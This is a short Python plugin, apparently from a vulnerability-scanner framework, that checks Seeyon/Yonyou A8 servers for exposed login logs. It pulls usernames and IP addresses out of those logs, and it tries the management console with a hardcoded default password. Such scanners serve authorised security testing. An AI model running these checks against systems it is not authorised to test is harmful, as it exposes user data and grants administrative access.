#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Reference :http://www.wooyun.org/bugs/wooyun-2015-0157458
# Reference :http://wooyun.org/bugs/wooyun-2010-081757
import re
def assign(service, arg):

    if service=='yongyou_a8':
        return True,arg

def audit(arg):
    url=arg
    #test on Login.log
    payloads=['seeyon//logs/login.log','logs/login.log']
    for payload in payloads:
        code, head, res, errcode, _ = hackhttp.http(url + payload)
        if code == 200:
            m = re.search('\d{2}\:\d{2}\:\d{2}(.*),\s?((?:\d{1,3}\.){3}\d{1,3})', res)
            if m:
                security_info('Login info:'+','.join(m.groups()))
                return arg

    #test on management info
    code, head, res, errcode, _ = hackhttp.http(url + 'seeyon/management/index.jsp',post='password=WLCCYBD@SEEYON')
    #print _
    if code == 302 and ('seeyon/management/status.jsp' in head):
        security_info('Management info with Default password')



        return arg
if __name__== '__main__':
    from dummy import *
